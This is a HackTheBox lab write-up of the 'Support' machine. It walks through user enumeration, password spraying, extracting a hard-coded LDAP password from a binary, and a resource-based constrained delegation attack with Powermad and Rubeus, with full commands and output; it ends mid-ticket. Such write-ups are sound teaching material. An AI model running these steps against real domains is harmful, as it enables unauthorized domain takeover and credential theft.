---
title: "Support - HTB Writeup"
header:
  teaser: /assets/images/2023-02-19-Support-HTB-Writeup/Support-HTB-Image.png
  header: /assets/images/2023-02-19-Support-HTB-Writeup/Support-HTB-Image.png
  og_image: /assets/images/2023-02-19-Support-HTB-Writeup/Support-HTB-Image.png
excerpt: "Support is an Active Directory server for a small organization. Simple credentials allow a custom binary to be stolen off of the file share on the server. Static credentials stored in the binary will allow an attacker to authenticate to the LDAP service, revealing a password in the comments of an LDAP entry for a service account. Using these credentials an attacker can perform a Resource-Based Constrained Delegation Attack on the domain controller, creating a remote Administrator session on the target host."
tags: [htb, writeup, support]
---

## Support - High Level Summary

Support is an Active Directory server for a small organization. Simple credentials allow a custom binary to be stolen off of the file share on the server. Static credentials stored in the binary will allow an attacker to authenticate to the LDAP service, revealing a password in the comments of an LDAP entry for a service account. Using these credentials an attacker can perform a Resource-Based Constrained Delegation Attack on the domain controller, creating a remote Administrator session on the target host.

### Recommendations

- Perform a privilege audit of the domain.
- Utilize Privileged Access Management on service accounts, especially shared accounts.
- Create a strict complex password policy for the domain.
- Do not store static credentials in custom binaries.
- Use user accounts or certificates to perform LDAP queries instead of a generic account.

---

## Support - Methodologies

### Information Gathering

#### Nmap Port Scan

Nmap performs port scanning to detect services exposed to the network on the target server. Since ports 53, 88, 389, and 464 are open to the local network this is an Active Directory server. Nmap predicts that the server is a Windows Server 2016 instance as well. We can assume that this is the domain controller that controls central authentication for the Windows environment at the target organization. Since this controls centralized authentication it will be a high-value target in any engagement.

```bash
sudo nmap -oN 10.10.11.174/nmap.out -sV -sC -Pn -O 10.10.11.174
[sudo] password for thadigus: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-04 13:27 EST
Nmap scan report for 10.10.11.174
Host is up (0.038s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-02-04 18:27:45Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016 (85%)
OS CPE: cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-time: 
|   date: 2023-02-04T18:27:52
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.12 seconds
```

### Service Enumeration

#### Nmap LDAP Scan

We can utilize Nmap to perform a scan with default LDAP scripts against the target's LDAP service to further enumerate the domain. With the output below we can see the LDAP service information that unauthenticated users can enumerate on the local network. The most important information here is the domain naming context and the LDAP service name of the remote server. We can utilize this information to attack the LDAP and Kerberos service on the server.

```bash
nmap -oN 10.10.11.174/nmap.ldap -n -sV --script "ldap* and not brute" -Pn -p 389 10.10.11.174
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-04 13:36 EST
Nmap scan report for 10.10.11.174
Host is up (0.038s latency).

PORT    STATE SERVICE VERSION
389/tcp open  ldap    Microsoft Windows Active Directory LDAP (Domain: support.htb, Site: Default-First-Site-Name)
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       domainFunctionality: 7
|       forestFunctionality: 7
|       domainControllerFunctionality: 7
|       rootDomainNamingContext: DC=support,DC=htb
|       ldapServiceName: support.htb:dc$@SUPPORT.HTB
|       isGlobalCatalogReady: TRUE
### SNIP ###
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=support,DC=htb
|       serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=support,DC=htb
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=support,DC=htb
|       namingContexts: DC=support,DC=htb
|       namingContexts: CN=Configuration,DC=support,DC=htb
|       namingContexts: CN=Schema,CN=Configuration,DC=support,DC=htb
|       namingContexts: DC=DomainDnsZones,DC=support,DC=htb
|       namingContexts: DC=ForestDnsZones,DC=support,DC=htb
|       isSynchronized: TRUE
|       highestCommittedUSN: 81986
|       dsServiceName: CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=support,DC=htb
|       dnsHostName: dc.support.htb
|       defaultNamingContext: DC=support,DC=htb
|       currentTime: 20230204183620.0Z
|_      configurationNamingContext: CN=Configuration,DC=support,DC=htb
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.60 seconds
```

#### Kerberos User Enumeration

Most attacks on Active Directory will utilize a username list on the server. This is done by sending pre-authentication packets, as the server will reveal whether or not the username is even valid on the domain within its response. This tool can be downloaded on the [Kerbrute Releases Page](https://github.com/ropnop/kerbrute/releases/tag/v1.0.3). Using a very large list of usernames we can enumerate the domain in this manner.

```bash
mv ~/Downloads/kerbrute_linux_amd64 ./
chmod +x ./kerbrute_linux_amd64
```

```bash
./kerbrute_linux_amd64 userenum -d SUPPORT.HTB --dc 10.10.11.174 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 02/04/23 - Ronnie Flathers @ropnop

2023/02/04 14:13:19 >  Using KDC(s):
2023/02/04 14:13:19 >   10.10.11.174:88

2023/02/04 14:13:20 >  [+] VALID USERNAME:       support@SUPPORT.HTB
2023/02/04 14:13:21 >  [+] VALID USERNAME:       guest@SUPPORT.HTB
2023/02/04 14:13:26 >  [+] VALID USERNAME:       administrator@SUPPORT.HTB
2023/02/04 14:14:14 >  [+] VALID USERNAME:       Guest@SUPPORT.HTB
2023/02/04 14:14:14 >  [+] VALID USERNAME:       Administrator@SUPPORT.HTB
2023/02/04 14:15:56 >  [+] VALID USERNAME:       management@SUPPORT.HTB
2023/02/04 14:16:11 >  [+] VALID USERNAME:       Support@SUPPORT.HTB
2023/02/04 14:17:01 >  [+] VALID USERNAME:       GUEST@SUPPORT.HTB
2023/02/04 14:27:01 >  [+] VALID USERNAME:       SUPPORT@SUPPORT.HTB

```

#### Crackmapexec

```bash
mkdir crackmapexec
cd crackmapexec
echo 'support                                                                    
quote> guest                                           
quote> administrator
quote> management' > users.list
crackmapexec smb '10.10.11.174' -u ./users.list -p /usr/share/wordlists/seclists/Passwords/500-worst-passwords.txt
```

```bash
crackmapexec smb '10.10.11.174' -u ./users.list -p /usr/share/wordlists/seclists/Passwords/500-worst-passwords.txt
SMB         10.10.11.174    445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.174    445    DC               [-] support.htb\support:123456 STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [-] support.htb\support:password STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [-] support.htb\support:12345678 STATUS_LOGON_FAILURE 
### SNIP ###
SMB         10.10.11.174    445    DC               [-] support.htb\administrator:tester STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [-] support.htb\administrator:mistress STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [-] support.htb\administrator:phantom STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [-] support.htb\administrator:billy STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [-] support.htb\administrator:6666 STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [-] support.htb\administrator:albert STATUS_LOGON_FAILURE 
SMB         10.10.11.174    445    DC               [+] support.htb\management:123456
```

```bash
management:123456
```

### Penetration

#### Management File Share

A file share exists on the target server and by using our credentials for the management file account we can pull files off of the server. There appear to be a few binaries for use in the organization. The only non-standard binary is UserInfo so we can dive into that binary first.

![Screenshot](/assets/images/2023-02-19-Support-HTB-Writeup/Screenshot_85.png)

After unzipping the binary it appears to be a Windows program with an `exe` file and a few `dll` files. To investigate further I will spin up my Windows lab machine and use it there. You should always run these types of experiments in a sandboxed environment. A disposable VM is the bare minimum. If you're running possibly dangerous code then you should ensure that there is no network connection and that you are using a sufficient sandbox within your virtual machine. To host an SMB share on your Kali box you can mount the local directory and use the following command with your local IP address.

```bash
impacket-smbserver -ip 172.16.219.128 -smb2support share ./
```

Then launch your Windows VM and PowerShell and you can browse the directory.

```powershell
PS C:\Windows\system32> cd \\172.16.219.128\share
PS Microsoft.PowerShell.Core\FileSystem::\\172.16.219.128\share> ls


    Directory: \\172.16.219.128\share


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         2/19/2020   2:05 AM         141184 System.Memory.dll
-a----        10/22/2021   4:48 PM          84608 Microsoft.Extensions.DependencyInjection.dll
-a----         5/27/2022  10:51 AM          12288 UserInfo.exe
-a----          2/4/2023  12:20 PM        2880728 7-ZipPortable_21.07.paf.exe
-a----          2/4/2023  12:20 PM          79171 windirstat1_1_2_setup.exe
-a----          3/1/2022  10:18 AM          99840 CommandLineParser.dll
-a----        10/22/2021   4:42 PM          22144 Microsoft.Bcl.AsyncInterfaces.dll
-a----          2/4/2023  12:20 PM       44398000 WiresharkPortable64_3.6.5.paf.exe
-a----         5/15/2018   6:29 AM         115856 System.Numerics.Vectors.dll
-a----         5/27/2022   9:59 AM            563 UserInfo.exe.config
-a----        10/22/2021   4:51 PM          64112 Microsoft.Extensions.Logging.Abstractions.dll
-a----        10/22/2021   4:48 PM          47216 Microsoft.Extensions.DependencyInjection.Abstractions.dll
-a----         2/19/2020   2:05 AM          20856 System.Buffers.dll
-a----          2/4/2023  12:20 PM        5439245 npp.8.4.1.portable.x64.zip
-a----          2/4/2023  12:20 PM        1273576 putty.exe
-a----         2/19/2020   2:05 AM          25984 System.Threading.Tasks.Extensions.dll
-a----          2/4/2023  12:20 PM       48102161 SysinternalsSuite.zip
-a----          2/4/2023  12:20 PM         277499 UserInfo.exe.zip
-a----        10/22/2021   4:40 PM          18024 System.Runtime.CompilerServices.Unsafe.dll


PS Microsoft.PowerShell.Core\FileSystem::\\172.16.219.128\share>
```

After running the binary it appears to be a tool to search for users. A help menu shows that there are options to search for users and retrieve user information. All queries say that the server is non-operational, so it must be connecting to a server on the backend.

```powershell
PS Microsoft.PowerShell.Core\FileSystem::\\172.16.219.128\share> .\UserInfo.exe user -username test
[-] Exception: The server is not operational.
```

#### Binary Inspection of UserInfo.exe

I also like to use [Wireshark](https://www.wireshark.org/) when I'm running binaries so that I can analyze network traffic coming from them while I perform commands. Download this and run it on the primary interface to listen to any network traffic. From here we can run the binary and experiment with it.

![Screenshot](/assets/images/2023-02-19-Support-HTB-Writeup/Screenshot_86.png)

We can add this DNS record to our `hosts` file on Windows located at `C:\Windows\System32\drivers\etc\hosts` to resolve the server. This will also require that we download and start the HackTheBox VPN on our Windows test machine so that it can reach the target server. The new `hosts` file will look like the following.

```bash
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
# 127.0.0.1       localhost
# ::1             localhost

10.10.11.174  support support.htb _ldap._tcp.support.htb
```

With this new connection, the application begins to interact with the server. We can see that it is now making queries and the DNS record would suggest that the application is using the LDAP service on the target server. This LDAP information is encrypted on the wire, and therefore we cannot intercept it with Wireshark.

```powershell
PS C:\Users\Thadigus\Documents> .\UserInfo.exe user -username test
[-] Unable to locate test. Please try the find command to get the user's username.
PS C:\Users\Thadigus\Documents> .\UserInfo.exe find -username test
[-] At least one of -first or -last is required.

Usage: UserInfo.exe [options] [commands]

Options:
  -v|--verbose        Verbose output


Commands:
  find                Find a user

  user                Get information about a user


'test' is not recognized as a valid command or option.

Did you mean:
        -last

PS C:\Users\Thadigus\Documents> .\UserInfo.exe find -first test
[-] No users identified with that query.
```

#### LDAP Password Recovery

We know that the application can make authenticated LDAP requests from our host machine. Because of this, we can assume that the source code has a password somewhere to perform this authentication. We know that the application is not pulling anything from the Windows host for authentication as this is a completely clean Windows 11 install with no previous association to the server. To locate the password we can utilize [DNSpy](https://github.com/dnSpy/dnSpy/releases).

After analyzing the source code we can see that a static password for the LDAP service is stored within the code. The username is simply `LDAP` but the password is stored in an encrypted format. It appears that the program will decrypt the password when it is required at runtime. We can explore this decryption code further to reverse engineer the cleartext password out of it.

![Screenshot](/assets/images/2023-02-19-Support-HTB-Writeup/Screenshot_87.png)

```C#
// Token: 0x04000005 RID: 5
private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
```

We can see that the password is base64 encoded and then encrypted with a static password of `armando`. Initial base64 decryption returns unusable binary data so we will have to utilize Python to decrypt the password back to ASCII.

```bash
┌──(thadigus㉿kali)-[~/HTB/Support/smb-support-share]
└─$ echo '0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E' | base64 -d  
������������������ֆՖ������������      
```

After using the Python interpreter to decrypt the password we are left with a long service account password that can be used to authenticate to the LDAP service with the `ldap` username.

```python
┌──(thadigus㉿kali)-[~/HTB/Support/smb-support-share]
└─$ python3
Python 3.10.9 (main, Dec  7 2022, 13:47:07) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from base64 import b64decode
>>> b64 = b"0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
>>> key = b"armando"
>>> decoded = b64decode(b64)
>>> from itertools import cycle
>>> bytearray([e^k^223 for e,k in zip(decoded, cycle(key))]).decode()
'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```

#### Authenticated LDAP Service Enumeration

With the credentials stolen from the custom application, we can see authenticate to the LDAP service. We can further enumerate the LDAP service and retrieve more information about the target domain. The following information was retrieved with ldapsearch.

```shell
ldapsearch -x -H 'ldap://support.htb' -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb"
```

One of the users accounts on the domain has a comment on it that looks like a password. This account's username is `support` and the password for it might be `Ironside47pleasure40Watchful`.

```shell
# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: support
c: US
l: Chapel Hill
st: NC
postalCode: 27514
distinguishedName: CN=support,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111200.0Z
whenChanged: 20220528111201.0Z
uSNCreated: 12617
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
uSNChanged: 12630
company: support
streetAddress: Skipper Bowles Dr
name: support
objectGUID:: CqM5MfoxMEWepIBTs5an8Q==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982099209777070
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: support
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111201.0Z
dSCorePropagationData: 16010101000000.0Z
```

A very loud, but easy, method for testing these types of credentials is on Evil-WinRM. If the account cannot log in on Evil-WinRM, though, it does not mean that they don't have access to the server. The 'Remote Management Users' group must be applied to the account. SMB client is another great way to test credentials on a machine. Evil-WinRM does allow us to utilize an easy win as this user is in the correct group. Using these credentials we can gain a shell on the box as shown below.

```text
┌──(thadigus㉿kali)-[~/HTB/Support]
└─$ evil-winrm -i 10.10.11.174 -u support -p 'Ironside47pleasure40Watchful'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\support\Documents> whoami
support\support
*Evil-WinRM* PS C:\Users\support\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\support\Desktop> type user.txt
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
*Evil-WinRM* PS C:\Users\support\Desktop> 
```

### Privilege Escalation

#### Domain Enumeration with Bloodhound

Now that we have an authenticated user session on the domain we can use SharpHound and  BloodHound to enumerate privileges in the domain to find a privilege escalation vector. Start by cloning the [BloodHound Repository](https://github.com/BloodHoundAD/BloodHound) and deliver the SharpHound executable in the Collectors directory to the target machine over Evil-WinRM. Use `SharpHound.exe -c All` to perform all collection methods on the target server and create a zip file to exfiltrate. Then download the file and run it in BloodHound. For detailed information on the use of BloodHound reference my [Sauna Guide](https://thadigus.gitlab.io/htb-writeups/2023-01-31-Sauna-HTB-Writeup/#domain-privilege-escalation).

```powershell
┌──(thadigus㉿kali)-[~/HTB/Support]
└─$ git clone https://github.com/BloodHoundAD/BloodHound
Cloning into 'BloodHound'...
remote: Enumerating objects: 11928, done.
remote: Counting objects: 100% (46/46), done.
remote: Compressing objects: 100% (36/36), done.
remote: Total 11928 (delta 18), reused 32 (delta 10), pack-reused 11882
Receiving objects: 100% (11928/11928), 183.92 MiB | 49.71 MiB/s, done.
Resolving deltas: 100% (8530/8530), done.
                                                                                                                                                                                                                
┌──(thadigus㉿kali)-[~/HTB/Support]
└─$ evil-winrm -i 10.10.11.174 -u support -p 'Ironside47pleasure40Watchful'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\support\Documents> upload /home/thadigus/HTB/Support/BloodHound/Collectors/SharpHound.exe SharpHound.exe
Info: Uploading /home/thadigus/HTB/Support/BloodHound/Collectors/SharpHound.exe to SharpHound.exe

                                                             
Data: 1402196 bytes of 1402196 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\support\Documents> .\SharpHound.exe -c All
2023-02-19T12:10:52.0643625-08:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
2023-02-19T12:10:52.2050331-08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
### SNIP ###
2023-02-19T12:11:38.6568468-08:00|WARNING|[CommonLib LDAPUtils]LDAP Exception in Loop: 81. (null). The LDAP server is unavailable.. Filter: (&(objectclass=trusteddomain)(securityidentifier=S-1-5-21-1677581083-3380853377-188903654)). Domain: (null)
System.DirectoryServices.Protocols.LdapException: The LDAP server is unavailable.
   at System.DirectoryServices.Protocols.LdapConnection.SendRequest(DirectoryRequest request, TimeSpan requestTimeout)
   at SharpHoundCommonLib.LDAPUtils.<QueryLDAP>d__33.MoveNext()
2023-02-19T12:11:38.7506058-08:00|INFORMATION|Consumers finished, closing output channel
Closing writers
2023-02-19T12:11:38.7818461-08:00|INFORMATION|Output channel closed, waiting for output task to complete
2023-02-19T12:11:38.8443420-08:00|INFORMATION|Status: 109 objects finished (+109 2.369565)/s -- Using 45 MB RAM
2023-02-19T12:11:38.8443420-08:00|INFORMATION|Enumeration finished in 00:00:46.1784811
2023-02-19T12:11:38.9380949-08:00|INFORMATION|Saving cache with stats: 68 ID to type mappings.
 68 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2023-02-19T12:11:38.9380949-08:00|INFORMATION|SharpHound Enumeration Completed at 12:11 PM on 2/19/2023! Happy Graphing!
*Evil-WinRM* PS C:\Users\support\Documents> ls


    Directory: C:\Users\support\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         2/19/2023  12:11 PM          12461 20230219121138_BloodHound.zip
-a----         2/19/2023  12:08 PM        1051648 SharpHound.exe
-a----         2/19/2023  12:11 PM          10176 YzgyNDA2MjMtMDk1ZC00MGYxLTk3ZjUtMmYzM2MzYzVlOWFi.bin


*Evil-WinRM* PS C:\Users\support\Documents> download 20230219121138_BloodHound.zip
Info: Downloading 20230219121138_BloodHound.zip to ./20230219121138_BloodHound.zip

                                                             
Info: Download successful!

*Evil-WinRM* PS C:\Users\support\Documents> exit

Info: Exiting with code 0
```

Once the domain information has been downloaded we can load it into BloodHound for further analysis. I always recommend users run BloodHound in Docker, as it is a clean and portable way to set up the application.

```shell
sudo apt install docker.io
sudo xhost +local:$(id -nu)
sudo docker run -it --rm -p 7474:7474 -e DISPLAY=unix$DISPLAY -v '/tmp/.X11-unix:/tmp/.X11-unix' --device=/dev/dri:/dev/dri -v $(pwd):/data --name bloodhound docker.io/belane/bloodhound
```

Since we are in the domain as the `support` user we can enumerate any privileges we have and even find a path to further our privileges on the domain. After some basic analysis, we can see that we are a part of the `Shared Support Accounts` group on the domain. This group has GenericAll permissions on the `DC.SUPPORT.HTB` computer in the domain. With these permissions, we can perform a Kerberos Resource-based Constrained Delegation attack. I will heavily use the [HackTricks Resouce-based Constrained Delegation Guide](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation) for this attack.

![Screenshot](/assets/images/2023-02-19-Support-HTB-Writeup/Screenshot_88.png)

![Screenshot](/assets/images/2023-02-19-Support-HTB-Writeup/Screenshot_89.png)

#### Resource-Based Constrained Delegation Attack

We will start with the use of [Powermad](https://github.com/Kevin-Robertson/Powermad) to create a new computer object called SERVICEA with the `PrincipalsAllowedToDelegateToAccount` permissions over the Domain Controller. Once the following has been completed there will be a new computer on the domain called `SERVICEA` with the password `123456`.

```powershell
*Evil-WinRM* PS C:\Users\support\Documents> upload /home/thadigus/HTB/Support/Powermad/Powermad.ps1
Info: Uploading /home/thadigus/HTB/Support/Powermad/Powermad.ps1 to C:\Users\support\Documents\Powermad.ps1

                                                             
Data: 180768 bytes of 180768 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\support\Documents> import-module .\Powermad.ps1
*Evil-WinRM* PS C:\Users\support\Documents> New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
Verbose: [+] Domain Controller = dc.support.htb
Verbose: [+] Domain = support.htb
Verbose: [+] SAMAccountName = SERVICEA$
Verbose: [+] Distinguished Name = CN=SERVICEA,CN=Computers,DC=support,DC=htb
[+] Machine account SERVICEA added
*Evil-WinRM* PS C:\Users\support\Documents> Set-ADComputer DC -PrincipalsAllowedToDelegateToAccount SERVICEA$
*Evil-WinRM* PS C:\Users\support\Documents> Get-ADComputer DC -Properties PrincipalsAllowedToDelegateToAccount


DistinguishedName                    : CN=DC,OU=Domain Controllers,DC=support,DC=htb
DNSHostName                          : dc.support.htb
Enabled                              : True
Name                                 : DC
ObjectClass                          : computer
ObjectGUID                           : afa13f1c-0399-4f7e-863f-e9c3b94c4127
PrincipalsAllowedToDelegateToAccount : {CN=SERVICEA,CN=Computers,DC=support,DC=htb}
SamAccountName                       : DC$
SID                                  : S-1-5-21-1677581083-3380853377-188903654-1000
UserPrincipalName                    :
```

Now that we have created a machine with the correct privileges we can utilize these permissions to perform an S4U attack, which will allow us to use these permissions to create a ticket with Administrative permissions over the target machine. With these new privileges, we will able to have full control over the target domain controller. To do this we must start with [Rubeus](https://github.com/GhostPack/Rubeus) on the target machine. A pre-compiled binary can be found [on GitHub](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/Rubeus.exe) but the tool should be compiled from the source on a real engagement.

```powershell
*Evil-WinRM* PS C:\Users\support\Documents> .\Rubeus.exe hash /password:123456 /user:SERVICEA$ /domain:support.htb

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0


[*] Action: Calculate Password Hash(es)

[*] Input password             : 123456
[*] Input username             : SERVICEA$
[*] Input domain               : support.htb
[*] Salt                       : SUPPORT.HTBhostservicea.support.htb
[*]       rc4_hmac             : 32ED87BDB5FDC5E9CBA88547376818D4
[*]       aes128_cts_hmac_sha1 : F6BF2C8FE53632C726D1B4C9A2699EB6
[*]       aes256_cts_hmac_sha1 : A7D5A56B29A33F4068C10A7AFD1B5A9A9688256CFFFB00D27ED769A9CDFE82A0
[*]       des_cbc_md5          : 159BBAB57F5DC240

*Evil-WinRM* PS C:\Users\support\Documents> .\Rubeus.exe s4u /user:SERVICEA$ /aes256:A7D5A56B29A33F4068C10A7AFD1B5A9A9688256CFFFB00D27ED769A9CDFE82A0 /aes128:F6BF2C8FE53632C726D1B4C9A2699EB6 /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /domain:support.htb /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: S4U

[*] Using aes256_cts_hmac_sha1 hash: A7D5A56B29A33F4068C10A7AFD1B5A9A9688256CFFFB00D27ED769A9CDFE82A0
[*] Building AS-REQ (w/ preauth) for: 'support.htb\SERVICEA$'
[*] Using domain controller: ::1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFjjCCBYqgAwIBBaEDAgEWooIElTCCBJFhggSNMIIEiaADAgEFoQ0bC1NVUFBPUlQuSFRCoiAwHqAD
      AgECoRcwFRsGa3JidGd0GwtzdXBwb3J0Lmh0YqOCBE8wggRLoAMCARKhAwIBAqKCBD0EggQ5nrfjre/c
      27LGCGHrahUHBDQjwcUC7YdqnzSjazQHfJQaqEP7ULtgN7mimtHYHPx/x9oMONSehj3qxxFKvRWNKYP7
      hfoqMjYcSXcdXHV+TyqsY11DoGEUfAs3QrrSEU9bjvviqpFf8oZegVzAl5cQWusXhM7/qy4oWQ9vQSpu
      /FfQpOpxHHnhOzRuW3b2eGA01A2X6PhPknwPs8cnnWmetPAwMb51XVOw8IAWsNQ9tIM7WufZ5Gewahs/
      Fa4H4zgiBeNLdVlR8rDwXfjAXf59DrvVo1Rogk3wxaZHivi02hc8XMee2RyhbOrCke5hCQIZd9J88cAr
      y91Jo1ferFP0pizaRGYgS67V3FCq+VWfaQsqWvVmph53xz/Wm1K8WcmI4udHFzLawstWMOuWvWJdPFsF
      N53M6f7uzVQFFqeG94Xk5S3348cncH9k6WL9jRFkuvgQpGSF3oSlep6Bq1Ace6KLbO1kA2BS7Kz28DgG
      nbhlTgKjjzNwpX52szwB7gmtzZV2QDG8i+szbUevj7eFO6t6jtWVe+8oqaP3V5JGSArgJM3Jkwm7YuVQ
      dwywBxlWEeTIpo1QRsb6oPcOlLk+6kK4OP0nDFRDTEwr1Hq87h9qdQXAFRWYlfTrpoB+ynLt44nVVExi
      Xq9+oqLN+VIKPaDHmwwtY/oxDdT0xfIPj/EbnHRewMxALzqeXUg3uwDXnlidxxkcuWh83S9LlwzYEilA
      PojsIZthtLONdwcTBf9fXTkoYvPEOe3X5HQdubJRQgua6qsOA/WSrIUAQtE3ObJa1Eoul5EHAkMhFEce
      1cavZuZZOIFPXENaAeHTcGJvgak6qdPinwpnpzfwc89mO7B+qCkBu0lLTbup1EGCRBxnCIO1RQqOgi0E
      t0ZKW7p+ZnMKVJbtDmcMq2orcILqny8pJap4C4yJ3k+eVl8+4Vw9Qw/BSvu6XZT/zfVohGCWaYLYfILE
      s7dvV3NKM5OUof/wq0sp7r6iUVN5scmeZTNqMOCgTOb6L1gj5VeJaLvbCKc7r5dCzJmq5CS6A2o4Ojfu
      H9eKa3/AkMwD1S3m+aFxm8jxuJA2WWm9RuM4hAAuRRsOrynj8FMAA1UOaKaHC46P96zilzzbqkOKu6zj
      dfFYhxZ5xI3+KrjFNU21Sdouby7mjJA1ro6Y24lze35vEiwXq2Mcv/7cOKWULC7yima5pRi6MiPftlu7
      +NENFvpht9VW1bZp8/Nd0bqEIuImUzPxP2EZUulAFxbTKy2HSA9qUqREHdLbmjNmt0+MGFn7aojmL/lW
